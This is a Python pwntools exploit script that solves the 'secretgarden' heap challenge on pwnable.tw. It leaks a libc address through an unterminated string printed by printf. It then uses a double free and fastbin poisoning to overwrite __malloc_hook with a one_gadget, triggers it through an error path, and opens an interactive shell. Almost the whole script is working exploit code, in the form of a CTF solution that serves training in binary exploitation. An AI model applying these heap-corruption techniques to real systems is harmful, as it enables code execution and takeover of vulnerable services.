
from pwn import *

exe = ELF("./secretgarden")
libc = ELF("./libc_64.so.6")
# ld = ELF("./ld-2.23.so")

# context.log_level = 'debug'
r = remote("chall.pwnable.tw", 10203)
def new(l,name,color):
	r.sendlineafter(b": ",str(1).encode())
	r.sendlineafter(b":",str(l).encode())
	r.sendafter(b":",name)
	r.sendlineafter(b":",color)

def visit():
	r.sendlineafter(b":",str(2).encode())
	
def remove(idx):
	r.sendlineafter(b":",str(3).encode())
	r.sendlineafter(b":",str(idx).encode())

def clean():
	r.sendlineafter(b":",str(4).encode())

#Allocate 0x80 byte chunk and free it to put it into unsorted bin
with log.progress("Stage 1: Allocating 0x80 byte and free it to put it into unsorted bin") as l:
    new(0x80,b"AAAA",b"BBBB") #0
    l.status("chunk[0]")
    #Prevent consolidation with top chunk
    new(0x28,b"AAAA",b"BBBB") #1
    l.status("Prevent top consolidation")
    remove(0)
    l.status("free[0]")
    remove(1)
    l.status("free[1]")
    l.success()

#Leak with printf due to our input string not being null-terminated
with log.progress("Stage 2: Leak with printf due to our input string not being null-terminated") as l:
    new(0x80,b"\x78",b"BBBB") #2
    l.status("allocating chunk[2]")
    clean()
    visit()
    r.recvuntil(b"] :")
    main_arena = u64(r.recv(6).ljust(8,b"\x00"))
    log.info(f"main_arena: {hex(main_arena)}")
    libc_base = main_arena - 0x3c3b78
    one_gadget = libc_base + 0xef6c4 
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    log.info(f"malloc_hook: {hex(malloc_hook)}")
    l.success(hex(libc_base))
#Because we can remove a rose twice, leading to double free
#The final step is to do fastbin poisoning
#At malloc_hook - 0x23 is a chunk with size 0x7f that we can use to bypass security check
with log.progress("Stage 3: Fastbin poisoning") as l:
    with log.progress("Stage 3.1: Allocatiing new chunks") as ll:
        for i in range(3):
            ll.status(f"{i+1}/3")
             #0
            # new(0x68,b"AAAA",b"BBBB") #1
            if i == 2:
                new(200,b"AAAA",b"BBBB") #3
            else:
                new(0x68,b"AAAA",b"BBBB")
        ll.success()

    l.status("Triggering double-free")
    remove(0)
    remove(1)
    remove(0)
    with log.progress("Stage 3.2: Allocating new chunk to overwrite malloc_hook") as ll:
        for _ in range(4):
            ll.status(f"{_+1}/4")
            if _ == 0:
                new(0x68,p64(malloc_hook - 0x23),b"BBBB") #4
            elif _ == 3:
                new(0x68,0x13 * b"A" + p64(one_gadget),b"BBBB") #7
            else:
                new(0x68,b"\x00",b"BBBB") #5

                

#We cannot immediately call raise a new rose, because there will not be any one_gadget that satisfy the constraint
#But when we trigger an error, strdup is called which will call malloc
#When we call malloc like that, there is one_gadget that satisfy the constraint
    with log.progress("Stage 3.3: Triggering double-free") as ll:
        for _ in range(2):
            ll.status(f"free: {_+1}/2")
            remove(0)
        ll.success()
r.interactive()